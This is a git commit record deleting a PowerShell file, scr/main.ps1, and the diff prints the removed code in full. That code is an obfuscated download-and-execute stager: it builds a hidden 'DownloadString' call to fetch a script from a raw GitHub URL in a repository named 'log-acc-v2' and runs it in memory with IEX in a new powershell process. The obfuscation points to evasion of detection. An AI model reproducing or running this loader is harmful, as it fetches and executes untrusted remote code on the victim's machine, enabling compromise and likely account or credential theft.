d777572d218b462511bceb823e47619cb54cc118
43a1723 <hai1723notgay@gmail.com>
2024-07-29 11:42:14 +0700

    Delete scr/main.ps1

--- scr/main.ps1
+++
@@ -1,3 +0,0 @@
-$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
